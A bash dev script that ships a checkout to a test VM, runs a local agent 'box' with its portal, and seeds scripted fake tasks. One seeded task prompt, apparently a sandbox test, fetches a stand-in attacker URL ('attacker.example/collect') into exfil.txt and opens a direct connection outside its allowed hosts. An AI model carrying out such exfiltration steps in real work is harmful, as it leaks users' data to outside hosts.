#!/usr/bin/env bash
# A box for portal work on a test VM, beside the installed one: its own BOX_HOME, API port 7790 and SpacetimeDB
# database, serving this checkout's portal/dist. Lima forwards the port: open http://127.0.0.1:7790 on the machine
# that runs the VM. It starts with tasks in every state the portal shows (all scripted, no model, test money only).
#   portal/dev-box.sh            ship this checkout, start the box fresh and seed it
#   portal/dev-box.sh dist       ship portal/dist only (the box serves files from disk, no restart)
#   portal/dev-box.sh restart    pull the plug: kill the box and its tasks at once, then boot it on the same data
#   portal/dev-box.sh stop       stop it and delete its data
# It leaves out the Elastic keys, so its seeded tasks never reach the shared Elastic index.
# Settings, all optional:
#   DEV_VM='limactl shell --workdir / box --'   how to run a command in the VM (any command that takes one after it)
#   DEV_URL=http://192.168.1.20:7700            the address a phone uses to reach the box, shown in the pairing QR
#   DEV=<name> DEV_PORT=<port>                  a second box beside the first (another checkout), with its own data
#   DEV_NAME='lab box'                          the box's name (default "dev box")
#   DEV_ORIGINS='*'                             let pages on other origins call it (the hosted app, app.gurtos.com)
set -euo pipefail
cd "$(dirname "$0")/.."
read -r -a vm_cmd <<< "${DEV_VM:-limactl shell --workdir / box --}"
vm() { "${vm_cmd[@]}" "$@"; }
name=${DEV:-portal-dev}
dest=/opt/box-dev/$name
home=/var/lib/box-$name
port=${DEV_PORT:-7790}

# The plug: the box's process group, every task user's processes, and the task mounts, all at once.
kill="pid=\$(cat /run/box-$name.pid 2>/dev/null || true); [ -n \"\$pid\" ] && kill -9 -\$pid 2>/dev/null; true
  for u in \$(awk -F: '\$3>=30000 && \$3<40000 {print \$1}' /etc/passwd); do [ -d $home/tasks/\${u#box-} ] && pkill -KILL -u \$u || true; done
  sleep 0.5; grep -o \" $home/[^ ]*\" /proc/mounts | sort -r | xargs -r -n1 umount -l; true"
wipe="$kill
  for u in \$(awk -F: '\$3>=30000 && \$3<40000 {print \$1}' /etc/passwd); do [ -d $home/tasks/\${u#box-} ] && userdel \$u || true; done 2>/dev/null
  rm -rf $home
  flock /run/lock/box-spacetime-cli.lock spacetime delete --server local -y box-$name >/dev/null 2>&1 || true"
start="cd $dest
  BOX_ID=${DEV:-dev-box} BOX_NAME='${DEV_NAME:-dev box}' BOX_URL=${DEV_URL:-http://192.168.1.20:7700} BOX_PEERS='[{\"id\":\"peer\",\"name\":\"second box\",\"stdb\":\"box\"}]' \
  BOX_ORIGINS='${DEV_ORIGINS:-}' BOX_HOME=$home BOX_PORT=$port BOX_VAULT=$home/vault.env BOX_STDB_DB=box-$name BOX_PROXY_PORT=auto \
  BOX_PORTAL=$dest/portal/dist setsid nohup node --experimental-strip-types --disable-warning=ExperimentalWarning core/box.ts \
  >> $home/box.log 2>&1 < /dev/null &
  echo \$! > /run/box-$name.pid
  for i in \$(seq 50); do curl -fs 127.0.0.1:$port/health >/dev/null && break; sleep 0.3; done"

case ${1:-} in
  stop) vm sudo bash -c "$wipe"; exit ;;
  dist) tar -czf - portal/dist | vm sudo bash -c "rm -rf $dest/portal/dist && tar -xzf - -C $dest"; exit ;;
  restart) vm sudo bash -c "$kill; sleep 3; $start; echo 'dev box restarted'"; exit ;;
esac

git ls-files -co --exclude-standard | while IFS= read -r f; do [[ -e $f ]] && printf '%s\n' "$f"; done |
  tar -czf - -T - | vm sudo bash -c "mkdir -p $dest && find $dest -mindepth 1 -maxdepth 1 ! -name node_modules -exec rm -rf {} + && tar -xzf - -C $dest"
vm sudo bash -s <<EOF
set -e
$wipe
cd $dest
lock=\$(sha256sum package-lock.json | cut -c1-16)
[ -f node_modules/.lock-\$lock ] || { npm ci --omit=dev --no-audit --no-fund --loglevel=error && touch node_modules/.lock-\$lock; }
mkdir -p $home/workspaces/home $home/workspaces/notes
printf 'Groceries: 42.10\nPower: 61.00\n' > $home/workspaces/home/budget.csv
printf '# Notes\n\nNothing yet.\n' > $home/workspaces/notes/notes.md
chmod -R a+rwX $home/workspaces
grep -v "^ELASTIC_" /etc/box/vault.env > $home/vault.env && echo DEMO_SECRET=portal-dev-test >> $home/vault.env && chmod 600 $home/vault.env
$start
task() { curl -fs 127.0.0.1:$port/api/tasks -H 'content-type: application/json' -d "\$1" | sed 's/.*"id":"\([^"]*\)".*/\1/'; }
f='"worker":"fake","source":"portal-dev"'
task '{"title":"Write the weekly notes",'"\$f"',"workspace":"notes","prompt":"write notes.md # Notes\nappend notes.md Groceries came in under budget.\nappend notes.md The deploy went out on Tuesday."}' >/dev/null
task '{"title":"Tidy the budget sheet",'"\$f"',"prompt":"append budget.csv Internet: 55.00\nwrite summary.txt Three bills, 158.10 in total."}' >/dev/null
sleep 2
u=\$(task '{"title":"Rename the photo folders",'"\$f"',"prompt":"write photos.txt renamed 212 folders"}')
sleep 1.5; curl -fs -X POST 127.0.0.1:$port/api/tasks/\$u/undo >/dev/null
task '{"title":"Check the test server",'"\$f"',"prompt":"sleep 1\nfail The test server did not answer after 3 tries"}' >/dev/null
task '{"title":"Find me a road bike",'"\$f"',"workspace":"notes","hosts":["example.com"],"prompt":"fetch http://example.com/ page.html\nsleep 4\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars."}' >/dev/null
task '{"title":"Buy a GPU hour",'"\$f"',"tools":["example.spend"],"budgetCents":500,"prompt":"call example.spend {\"cents\":800,\"on\":\"a GPU hour\"}\nwrite gpu.txt booked"}' >/dev/null
task '{"title":"Deploy the new build",'"\$f"',"prompt":"ask Deploy build 214 to the home server now?\nwrite deployed.txt yes"}' >/dev/null
task '{"title":"Fix the failing test",'"\$f"',"prompt":"append progress.txt read the test\nsleep 2\nappend progress.txt found the bug\nsleep 900\nwrite fixed.txt yes"}' >/dev/null
task '{"title":"Long job",'"\$f"',"prompt":"append progress.txt 1\nsleep 3\nappend progress.txt 2\nsleep 900\nappend progress.txt 3"}' >/dev/null
echo "dev box up: http://127.0.0.1:$port (log: $home/box.log)"
EOF
